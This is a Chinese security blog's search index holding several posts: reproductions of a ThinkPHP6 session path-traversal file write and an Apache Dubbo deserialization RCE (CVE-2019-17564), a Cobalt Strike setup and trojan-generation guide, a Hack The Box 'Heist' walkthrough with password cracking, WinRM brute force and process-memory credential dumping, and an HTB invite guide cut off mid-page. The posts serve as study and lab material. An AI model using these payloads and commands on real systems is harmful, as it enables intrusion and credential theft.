<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>thinkphp6 session文件操作漏洞复现</title>
      <link href="/2020/02/20/thinkphp6-session-wen-jian-cao-zuo-lou-dong/"/>
      <url>/2020/02/20/thinkphp6-session-wen-jian-cao-zuo-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-漏洞概述"><a href="#0x00-漏洞概述" class="headerlink" title="0x00 漏洞概述"></a>0x00 漏洞概述</h1><p>在目标环境为Windows且开启session的情况下，容易遭受任意文件删除攻击。<br>在目标环境开启session且写入的session可控的情况下，容易遭受任意文件写入攻击。</p><h1 id="0x01-影响范围："><a href="#0x01-影响范围：" class="headerlink" title="0x01 影响范围："></a>0x01 影响范围：</h1><p><code>top-think/framework 6.x &lt; 6.0.2</code></p><h1 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h1><ul><li><p>安装composer，ubuntu下 <code>apt install composer</code></p></li><li><p>使用composer安装thinkphp</p><pre><code># 解决composer下载速度慢问题composer config -g repo.packagist composer https://packagist.phpcomposer.com# 使用composer安装指定版本的thinkphpcomposer create-project topthink/think=6.0.1  tp6 --prefer-dist# 如提示系统中缺少所请求的PHP扩展名mbstring，# 运行以下命令，7.2根据php版本更改sudo apt-get install php7.2-mbstring# 进入tp目录，更改phpthink版本composer require topthink/framework:6.0.1</code></pre></li><li><p>thinkphp6默认是未开启session功能的,我们需要在``app\middleware.php`文件中开启</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/img/20200227194534.png" alt></p></li><li><p><code>app\controller\Index.php</code>中添加测试代码</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/img/20200227195015.png" alt></p></li></ul><pre class=" language-PHP"><code class="language-PHP"><?php    namespace app\controller;use app\BaseController;use think\facade\Session;class Index extends BaseController{    public function index()    {        Session::set('name','thinkphp');        return 1;    }    public function hello($name = 'ThinkPHP6')    {        return 'hello,' . $name;    }}</code></pre><ul><li><code>php think run</code>  进tp目录启动调试环境</li></ul><h1 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h1><p>thinkphp的网站一般会把<code>/public</code>设置为网站的根目录,</p><p>而生成的文件是在<code>/runtime/session</code> 文件夹下面的,</p><p>默认是访问不到的，这个即可绕过</p><p><code>PHPSESSID=/../../../public/aaaaaaaaaaa.php</code></p><p>session里的内容:</p><p><code>a:1:{s:4:&quot;name&quot;;s:8:&quot;thinkphp&quot;;}</code></p><p><a href="https://github.com/lanyi1998/pochub/blob/master/thinkphp6_file_write.py" target="_blank" rel="noopener">POC</a>，存在误报</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/img/20200227204404.png" alt></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://mp.weixin.qq.com/s/8k96KSpWMk7S4-_TzweXxg" target="_blank" rel="noopener">thinkphp6 session 任意文件创建漏洞复现 含POC</a></p><p><a href="https://blog.csdn.net/q851579181q/article/details/104344999?depth_1-utm_source=distribute.pc_relevant.none-task&utm_source=distribute.pc_relevant.none-task" target="_blank" rel="noopener">从无到有分析thinkphp6 session文件操作漏洞_PHP_blus-CSDN博客</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> Thinkphp </tag>
            
            <tag> 文件创建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache Dubbo反序列化漏洞复现(CVE-2019-17564)</title>
      <link href="/2020/02/14/apache-dubbo-deserialization-vulnerability-cve-2019-17564/"/>
      <url>/2020/02/14/apache-dubbo-deserialization-vulnerability-cve-2019-17564/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-漏洞详情"><a href="#0x00-漏洞详情" class="headerlink" title="0x00 漏洞详情"></a>0x00 漏洞详情</h1><p><code>CVE-2019-17564</code>是Apache Dubbo HTTP协议中的一个反序列化漏洞,该漏洞的主要原因在于当<code>Apache Dubbo</code>启用HTTP协议之后，<code>Apache Dubbo</code>在接受来自消费者的远程调用请求的时候存在一个不安全的反序列化行为，当项目包中存在可用的<code>gadgets</code>时即可导致远程代码执行。</p><h1 id="0x01-影响范围"><a href="#0x01-影响范围" class="headerlink" title="0x01 影响范围"></a>0x01 影响范围</h1><ul><li><p>2.7.0 &lt;= Apache Dubbo &lt;= 2.7.4</p></li><li><p>2.6.0 &lt;= Apache Dubbo &lt;= 2.6.7</p></li><li><p>Apache Dubbo = 2.5.x </p></li></ul><h1 id="0x02漏洞复现"><a href="#0x02漏洞复现" class="headerlink" title="0x02漏洞复现"></a>0x02漏洞复现</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul><li>JDK 1.8</li><li>Zookeeper</li></ul><p>Dubbo启动依赖zookeeper</p><p>win10安装</p><p>下载 <a href="https://archive.apache.org/dist/zookeeper/zookeeper-3.4.10/zookeeper-3.4.10.tar.gz" target="_blank" rel="noopener">Zookeeper</a></p><p>解压后将conf目录下的zoo_sample.cfg文件更名为zoo.cfg</p><p>直接在命令行中运行bin目录下的zkServer.cmd就可以了</p><ul><li>Dubbo-samples-http</li></ul><p><a href="https://github.com/apache/dubbo-samples" target="_blank" rel="noopener">下载源码</a></p><p>http部分导入idea</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/img/20200214160509.png" alt></p><p>修改pom.xml中32行<code>dubbo.version</code>为2.7.1</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/img/20200214160750.png" alt></p><p>导入一个可控的gadgets,例如<code>commons-collections4-4.0</code></p><p>启动``Zookeeper<code>和</code>HttpProvider`</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/img/20200214161003.png" alt></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>使用<code>ysoserial</code>生成payload</p><p><code>java -jar ysoserial-0.0.6-SNAPSHOT-BETA-all.jar CommonsCollections4 calc &gt; 1.ser</code></p><p>burp导入生成的payload 发送</p><pre><code>POST /org.apache.dubbo.samples.http.api.DemoService HTTP/1.1 Host: 192.168.0.102:8080 &lt;ysoserial生成的payload&gt;</code></pre><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/img/20200214161504.png" alt></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://qiita.com/shimizukawasaki/items/39c9695d439768cfaeb5" target="_blank" rel="noopener">[漏洞分析]CVE-2019-17564/Apache Dubbo存在反序列化漏洞 </a></p><p><a href="https://blog.csdn.net/caiqiiqi/article/details/104279860" target="_blank" rel="noopener">[CVE-2019-17564] Apache Dubbo deserialization vulnerability_caiqiiqi</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> Apache Dubbo </tag>
            
            <tag> Deserialization </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobalt Strike使用指南—免杀篇</title>
      <link href="/2019/12/10/cobalt-strike-shi-yong-zhi-nan-mian-sha-pian/"/>
      <url>/2019/12/10/cobalt-strike-shi-yong-zhi-nan-mian-sha-pian/</url>
      
        <content type="html"><![CDATA[<h1 id="Cobalt-Strike使用指南—免杀篇"><a href="#Cobalt-Strike使用指南—免杀篇" class="headerlink" title="Cobalt Strike使用指南—免杀篇"></a>Cobalt Strike使用指南—免杀篇</h1>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cobalt Strike </tag>
            
            <tag> CS </tag>
            
            <tag> 远控 </tag>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobalt Strike使用指南—入门篇</title>
      <link href="/2019/12/09/cobalt-strike-shi-yong-zhi-nan-ru-men-pian/"/>
      <url>/2019/12/09/cobalt-strike-shi-yong-zhi-nan-ru-men-pian/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-CS简介"><a href="#0x00-CS简介" class="headerlink" title="0x00 CS简介"></a>0x00 CS简介</h1><p>Cobalt Strike 一款以Metasploit为基础的GUI框架式渗透测试工具，集成了端口转发、服务扫描，自动化溢出，<br>多模式端口监听，exe、powershell木马生成等。</p><p>Cobalt Strike 分为客户端和服务端，可分布式操作、协同作战。<br>但一定要架设在外网上，或者自己想要搭建的环境中。</p><p>这里给出一些学习链接：</p><p><a href="https://github.com/dylan903/Cobalt_Strike_wiki" target="_blank" rel="noopener">Cobalt_Strike_wiki: Cobalt Strike系列</a><br><a href="https://xz.aliyun.com/t/3975" target="_blank" rel="noopener">渗透利器Cobalt Strike</a><br><a href="https://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=178" target="_blank" rel="noopener">Cobaltstrike系列教程 - 首选i春秋论坛精选</a></p><h1 id="0x01-部署安装"><a href="#0x01-部署安装" class="headerlink" title="0x01 部署安装"></a>0x01 部署安装</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>Team Server 推荐运行环境</p><ul><li>Kali Linux 1.0, 2.0 – i386 and AMD64</li><li>Ubuntu Linux 12.04, 14.04 – x86, and x86_64</li></ul><p>Client GUI 运行环境</p><ul><li>Windows 7 and above</li><li>macOS X 10.10 and above</li><li>Kali Linux 1.0, 2.0 – i386 and AMD64</li><li>Ubuntu Linux 12.04, 14.04 – x86, and x86_64</li></ul><p>由于<code>cobaltstrike</code>为<code>java</code>编写,<br>所以客户端和服务端都需要安装<code>java</code>运行环境</p><h2 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h2><p>服务端关键的文件是<code>teamserver</code>以及<code>cobaltstrike.jar</code><br>将这两个文件放到服务器上同一个目录，然后运行：</p><p><code>chmod 755 teamserver</code><br><code>sudo ./teamserver 192.168.1.1 asdf # ip 和密码</code></p><p>如果是本地测试，本机既当服务端，又当客户端<br>可填入本机ip，不要填<code>127.0.0.1</code>或者<code>0.0.0.0</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191209153500.png" alt></p><p>乌班图如果出现这个报错。</p><pre><code>[-] keytool is not in $PATH    install the Java Developer Kit</code></pre><p>加一个软链即可</p><p><code>ln -s /usr/java/jdk/bin/keytool /usr/bin/</code></p><h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h2><p>windows客户端打开<code>cobaltstrike.bat</code>批处理文件</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191209153619.png" alt></p><p>输入服务端的设置的IP、端口、密码，用户名随意，登陆即可</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191209153902.png" alt></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191209154047.png" alt></p><h1 id="0x02-简单使用"><a href="#0x02-简单使用" class="headerlink" title="0x02 简单使用"></a>0x02 简单使用</h1><p>这里只介绍下简单操作，其它后面学习了再总结。</p><h2 id="设置Listeners"><a href="#设置Listeners" class="headerlink" title="设置Listeners"></a>设置Listeners</h2><p>这里使用<code>win7</code>虚拟机进行演示</p><p>首先添加<code>Listeners</code>,填入服务端的IP，和想要监听的端口</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191210171137.png" alt></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191210171355.png" alt></p><h2 id="生成木马"><a href="#生成木马" class="headerlink" title="生成木马"></a>生成木马</h2><p>生成exe木马</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191210171522.png" alt></p><p>根据目标来选择是否使用<code>x64</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191210171601.png" alt></p><p>将生成的exe文件复制到虚拟机双击执行<br>即可看到靶机上线</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191210171942.png" alt></p><h2 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h2><p>在Cobalt Strike中它的心跳默认是60s<br>即sleep时间为60s，每一分钟目标主机与teamserver通信一次，<br>所有执行命令或者其它操作都会等待60s，所有先执行修改sleep为0<br>(根据实际情况修改，太快流量明显)</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191210172025.png" alt></p><p>右击，选择<code>Interact</code>,最下面可以输入命令<br>beacon中不能直接输入cmd命令，如果要执行cmd命令，前面要加上<code>shell</code><br>例如：<code>shell whoami</code><br>其他的<code>beacon</code>命令，大家可以在<code>beacon</code>中输入<code>help</code>查看</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191210172627.png" alt></p><p>三方提权模块：<br><a href="https://github.com/dylan903/ElevateKit" target="_blank" rel="noopener">ElevateKit: The Elevate Kit demonstrates how to use third-party privilege escalation attacks with Cobalt Strike’s Beacon payload.</a></p><p>点击Script Manager按钮打开脚本管理界面，然后点击底下的Load按钮加载elevate.cna文件<br>如果提权成功，session列表中会增加一个新会话，星号(*)表示该会话是一个提权成功的会话。<br>提权成功后我们再执行危险操作时被控PC就不会有UAC提示，被控目标也不会察觉。</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.o2oxy.cn/2361.html" target="_blank" rel="noopener">Cobalt Strike使用 - print(“”)</a><br><a href="https://xz.aliyun.com/t/3975" target="_blank" rel="noopener">渗透利器Cobalt Strike - 第1篇 功能及使用</a><br><a href="https://www.freebuf.com/sectool/133369.html" target="_blank" rel="noopener">Cobalt Strike学习笔记（持续更新）</a><br><a href="https://blog.csdn.net/qq_26091745/article/details/98097401" target="_blank" rel="noopener">Cobaltstrike系列教程(一)简介与安装</a></p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cobalt Strike </tag>
            
            <tag> CS </tag>
            
            <tag> 远控 </tag>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB(Hack The Box)系列—Heist</title>
      <link href="/2019/12/03/htb-hack-the-box-xi-lie-heist/"/>
      <url>/2019/12/03/htb-hack-the-box-xi-lie-heist/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>今天挑战的靶机是Hack The Box的“Heist”，<code>10.10.10.149</code></p><h1 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h1><p>使用<code>masscan</code>进行全端口扫描</p><p><code>masscan -p 1-65535,U:1-65535 -e tun0 10.10.10.149 --rate=1000</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191202160154.png" alt></p><p>使用<code>nmap</code>查看端口详细信息</p><p><code>nmap -A -p 80,135,445,5985,49669 10.10.10.149</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191202161302.png" alt></p><p>尝试连接<code>smb</code>，发现需要密码</p><p><code>smbclient --list 10.10.10.149 -U &quot;&quot;</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191202163244.png" alt></p><p>浏览器访问80端口，需要登陆，可以以游客身份登陆</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191202163737.png" alt></p><p>一个叫<code>Hazard</code>的用户提交了一个<code>issue</code>，是关于他的思科路由器的问题，<br>并且发出了他的配置文件</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191202164032.png" alt></p><p>打开配置文件找到了一些用户名和密码</p><h1 id="0x02-爆破密码"><a href="#0x02-爆破密码" class="headerlink" title="0x02 爆破密码"></a>0x02 爆破密码</h1><p>一般来说，思科设备的密码会以两种形式保存在IOS配置文件中，<br>一种是思科的<code>Type 7</code>加密形式，一种是<code>Type 5</code>加密形式。<br>前者是思科自己的加密形式，存在多年，但是这种加密方式很简单，是可以进行破解的。<br>后者相当于MD5加密，是无法被破解的（除非是弱密码，能通过字典进行暴力破解）。</p><p><code>[...] enable password 7 046E1803362E595C260E0B240619050A2D</code><br><code>[...] username &#39;user&#39; password 7 046E1803362E595C260E0B240619050A2D</code></p><p>这样类似的语句是思科的<code>Type 7</code>加密形式</p><p><code>[...] enable secret 5 $1$SpMm$eALjeyED.WSZs0naLNv22/</code><br><code>[...] username ‘user’ secret 5 $1$SpMm$eALjeyED.WSZs0naLNv22/</code></p><p>这样类似的语句是思科的<code>Type 5</code>加密形式</p><pre><code>version 12.2no service padservice password-encryption!isdn switch-type basic-5ess!hostname ios-1!security passwords min-length 12enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91!username rout3r password 7 0242114B0E143F015F5D1E161713username admin privilege 15 password 7 02375012182C1A1D751618034F36415408!!ip ssh authentication-retries 5ip ssh version 2!!router bgp 100 synchronization bgp log-neighbor-changes bgp dampening network 192.168.0.0 mask 300.255.255.0 timers bgp 3 9 redistribute connected!ip classlessip route 0.0.0.0 0.0.0.0 192.168.0.1!!access-list 101 permit ip any anydialer-list 1 protocol ip list 101!no ip http serverno ip http secure-server!line vty 0 4 session-timeout 600 authorization exec SSH transport input ssh</code></pre><p>这里给出两个在线解密网址<br><a href="http://www.ifm.net.nz/cookbooks/passwordcracker.html" target="_blank" rel="noopener">http://www.ifm.net.nz/cookbooks/passwordcracker.html</a><br><a href="https://www.xiaopeiqing.com/cisco-password-cracker/" target="_blank" rel="noopener">https://www.xiaopeiqing.com/cisco-password-cracker/</a></p><p><code>Type 7</code>加密形式直接解密即可</p><p><code>0242114B0E143F015F5D1E161713</code>             —&gt;    <code>$uperP@ssword</code><br><code>02375012182C1A1D751618034F36415408</code>  —&gt;    <code>Q4)sJu\Y8qz*A3?d</code></p><p><code>Type 5</code>加密形式这里使用<code>john</code>来破解<br>破解过的密码会存储在home目录下的隐藏文件<code>.john/john.pot</code>中</p><p>将<code>$1$pdQG$o8nrSzsGXeaduXrjlvKc91</code>添加到文本文件。<br>使用Kali自带的<code>rockyou.txt</code>字典（常用的弱口令大全）来破解</p><p><code>$1$pdQG$o8nrSzsGXeaduXrjlvKc91</code>          —&gt;    <code>stealth1agent</code></p><p>如果第一次使用请解压：</p><p><code>gzip -d /usr/share/wordlists/rockyou.txt.gz</code></p><pre><code>vim hash.txtjohn --wordlist=/usr/share/wordlists/rockyou.txt ./hash.txt john --show ./hash.txt </code></pre><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191203141941.png" alt></p><h1 id="0x03-SMB"><a href="#0x03-SMB" class="headerlink" title="0x03 SMB"></a>0x03 SMB</h1><p>猜测上面提交<code>issue</code>的用户<code>hazard</code>存在<br>尝试使用用户名:<code>hazard</code>  密码： <code>stealth1agent</code> 连接smb<br>成功连接，但是没有什么发现</p><p><code>smbclient --list 10.10.10.149 -U &quot;hazard&quot;</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191203144754.png" alt></p><h1 id="0x04-枚举用户"><a href="#0x04-枚举用户" class="headerlink" title="0x04 枚举用户"></a>0x04 枚举用户</h1><p>然后尝试使用<a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/lookupsid.py" target="_blank" rel="noopener">lookupsid.py</a>脚本来枚举其它用户</p><pre><code>wget https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/lookupsid.pypython lookupsid.py hazard:stealth1agent@10.10.10.149</code></pre><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191203162833.png" alt></p><h1 id="0x05-爆破Winrm"><a href="#0x05-爆破Winrm" class="headerlink" title="0x05 爆破Winrm"></a>0x05 爆破Winrm</h1><p>目标机上开放了winrm 5985端口<br>将解密出来的密码和用户名添加到txt文件<br>使用metasploit来尝试爆破密码</p><pre><code>use auxiliary/scanner/winrm/winrm_loginset pass_file /root/HTB/Heist/password.txtset user_file /root/HTB/Heist/user.txtset rhosts 10.10.10.149run</code></pre><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191203174209.png" alt></p><p>成功跑出来一个<br><code>chase:Q4)sJu\Y8qz*A3?d</code><br>使用<a href="https://github.com/Hackplayers/evil-winrm" target="_blank" rel="noopener">evil-winrm</a>工具获取shell<br>得到<code>user.txt</code></p><pre><code>gem install evil-winrm     // 安装evil-winrmevil-winrm -i 10.10.10.149 -u chase -p &#39;Q4)sJu\Y8qz*A3?d&#39;</code></pre><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191203163853.png" alt></p><h1 id="0x06-dump进程"><a href="#0x06-dump进程" class="headerlink" title="0x06 dump进程"></a>0x06 dump进程</h1><p>然后找了一圈，没发现其它的东西<br>查看进程，发现有几个<code>Firefox</code>进程</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191203183945.png" alt></p><p>然后尝试上传<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump" target="_blank" rel="noopener">ProcDump</a>工具</p><p><code>upload /root/HTB/Heist/procdump64.exe</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191203184357.png" alt></p><p><code>./procdump64.exe -mp 6176    // 6176为进程ID号</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191203204506.png" alt></p><p>再上传<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/strings" target="_blank" rel="noopener">Strings</a></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191203205249.png" alt></p><p>使用<code>strings</code>工具读取<code>dmp</code>文件，并保存结果为<code>txt</code><br>查找<code>txt</code>文件发现该浏览器不断请求这个url 并且是明文密码传输</p><pre><code>cmd /c &quot;strings64.exe -accepteula firefox.exe_191203_172802.dmp &gt; firefox.exe_191203_172802.txt&quot;findstr &quot;password&quot; ./firefox.exe_191203_172802.txt</code></pre><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191203204836.png" alt></p><h1 id="0x07-登陆admin"><a href="#0x07-登陆admin" class="headerlink" title="0x07 登陆admin"></a>0x07 登陆admin</h1><p>尝试用链接中的密码<code>4dD!5}x/re8]FBuZ</code>登陆<code>Administrator</code><br>成功登陆获取<code>root.txt</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191203210511.png" alt></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.freebuf.com/sectool/210479.html" target="_blank" rel="noopener">evil-winrm：Windows远程管理（WinRM）Shell终极版</a><br><a href="https://0xrick.github.io/hack-the-box/heist/" target="_blank" rel="noopener">Hack The Box - Heist | 0xRick</a><br><a href="https://infosec.rm-it.de/" target="_blank" rel="noopener">infosec.rm-it.de</a><br><a href="https://www.freebuf.com/sectool/184573.html" target="_blank" rel="noopener">CrackMapExec：一款针对大型Windows活动目录(AD)的后渗透工具</a></p>]]></content>
      
      
      <categories>
          
          <category> HTB系列 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> Hack The Box </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB(Hack The Box)系列—入门指南</title>
      <link href="/2019/12/02/htb-hack-the-box-xi-lie-ru-men-zhi-nan/"/>
      <url>/2019/12/02/htb-hack-the-box-xi-lie-ru-men-zhi-nan/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><h1 id="0x01-注册登陆"><a href="#0x01-注册登陆" class="headerlink" title="0x01 注册登陆"></a>0x01 注册登陆</h1><p>注册需要邀请码</p><h2 id="快速获取邀请码"><a href="#快速获取邀请码" class="headerlink" title="快速获取邀请码"></a>快速获取邀请码</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>首先打开邀请界面</p><p><a href="https://www.hackthebox.eu/invite" target="_blank" rel="noopener">https://www.hackthebox.eu/invite</a></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191203105144.png" alt></p><p>按下F12，打开<code>Console</code><br>输入如下代码执行</p><pre><code>$.post(&#39;https://www.hackthebox.eu/api/invite/generate&#39;,function(data){console.log(data)})`// 这里的$就是jQuery不是Chrome里querySelector，因为这个页面已经载入了jQuery。</code></pre><p>会返回如下数据：</p><p><code>{&quot;success&quot;:1,&quot;data&quot;:{&quot;code&quot;:&quot;TExRRlAtSldNTkstVEdNWFotU1pIQVItRlhWWkM=&quot;,&quot;format&quot;:&quot;encoded&quot;},&quot;0&quot;:200}</code></p><p><code>code</code>的值即为加密的邀请码</p><p><code>TExRRlAtSldNTkstVEdNWFotU1pIQVItRlhWWkM=</code></p><p>进行<code>Base64</code>解密即可，注意要把复制的双引号去掉</p><p><code>LLQFP-JWMNK-TGMXZ-SZHAR-FXVZC</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191203112444.png" alt></p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>使用curl或者其它任何可以发送POST请求的工具都可以<br>得到返回数据解密即可</p><pre><code>curl -X POST https://www.hackthebox.eu/api/invite/generate{&quot;success&quot;:1,&quot;data&quot;:{&quot;code&quot;:&quot;RkxFR0wtV1VEWk4tRUhQRkMtR1RRVlMtT0ZIWFk=&quot;,&quot;format&quot;:&quot;encoded&quot;},&quot;0&quot;:200}</code></pre><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191203113630.png" alt></p><h2 id="详细步骤"><a href="#详细步骤" class="headerlink" title="详细步骤"></a>详细步骤</h2><p>首先打开邀请界面</p><p><a href="https://www.hackthebox.eu/invite" target="_blank" rel="noopener">https://www.hackthebox.eu/invite</a></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191203105144.png" alt></p><p>按下F12,打开Network</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191203110206.png" alt></p><p>有一个<code>inviteapi.min.js</code>的请求（没有的话就刷新下）<br>直译就是邀请API，双击打开</p><p><a href="https://www.hackthebox.eu/js/inviteapi.min.js" target="_blank" rel="noopener">https://www.hackthebox.eu/js/inviteapi.min.js</a></p><p>内容如下：</p><pre><code>eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!&#39;&#39;.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return&#39;\\w+&#39;};c=1};while(c--){if(k[c]){p=p.replace(new RegExp(&#39;\\b&#39;+e(c)+&#39;\\b&#39;,&#39;g&#39;),k[c])}}return p}(&#39;1 i(4){h 8={&quot;4&quot;:4};$.9({a:&quot;7&quot;,5:&quot;6&quot;,g:8,b:\&#39;/d/e/n\&#39;,c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:&quot;7&quot;,5:&quot;6&quot;,b:\&#39;/d/e/k/l/m\&#39;,c:1(0){3.2(0)},f:1(0){3.2(0)}})}&#39;,24,24,&#39;response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify&#39;.split(&#39;|&#39;),0,{}))</code></pre><p>加过密的JS代码，直接百度js解密<br>解密之后的代码如下：</p><pre><code>function verifyInviteCode(code) {    var formData = {        &quot;code&quot;: code    };    $.ajax({        type: &quot;POST&quot;,        dataType: &quot;json&quot;,        data: formData,        url: &#39;/api/invite/verify&#39;,        success: function(response) {            console.log(response)        },        error: function(response) {            console.log(response)        }    })}function makeInviteCode() {    $.ajax({        type: &quot;POST&quot;,        dataType: &quot;json&quot;,        url: &#39;/api/invite/how/to/generate&#39;,        success: function(response) {            console.log(response)        },        error: function(response) {            console.log(response)        }    })}</code></pre><p>定义了两个函数，<code>verifyInviteCode(code)</code>和<code>makeInviteCode()</code><br>这里直接在邀请页面<code>F12</code>，打开控制台<code>Console</code>，执行<code>makeInviteCode()</code><br>返回如下内容：</p><p><code>{0: 200, success: 1, data: {…}}</code></p><p>点击三角符号展开，会发现这里的data部分是被加密的。<br>返回值中包含了加密的文本<code>data</code>和加密方式<code>enctype</code>，如下图加密方式为<code>&quot;BASE64&quot;</code><br>加密方式是随机的几种,网上搜索对应的解密工具即可,解密后得到下面的内容。</p><p><code>In order to generate the invite code, make a POST request to /api/invite/generate</code></p><p>然后安装上面的快速获取邀请码的步骤执行即可。</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191203111338.png" alt></p><h1 id="0x02-kali连接HTB"><a href="#0x02-kali连接HTB" class="headerlink" title="0x02 kali连接HTB"></a>0x02 kali连接HTB</h1><p>在<code>access</code>页面点击<code>Connection Pack</code>下载<code>openvpn</code>配置文件<br>或者点击如下连接下载</p><p><a href="https://www.hackthebox.eu/home/htb/access/ovpnfile" target="_blank" rel="noopener">https://www.hackthebox.eu/home/htb/access/ovpnfile</a></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191203114624.png" alt></p><p><code>openvpn</code>配置文件复制到<code>kali</code>，并在所在路径执行</p><p><code>sudo openvpn --config xxxx.ovpn</code></p><p><code>openvpn</code>kali最新版好像有，如果没有安装一下再执行就好了。</p><p><code>sudo apt-get install openvpn</code></p><p>执行成功后就会打勾,执行成功后不用关闭终端。</p><p><img 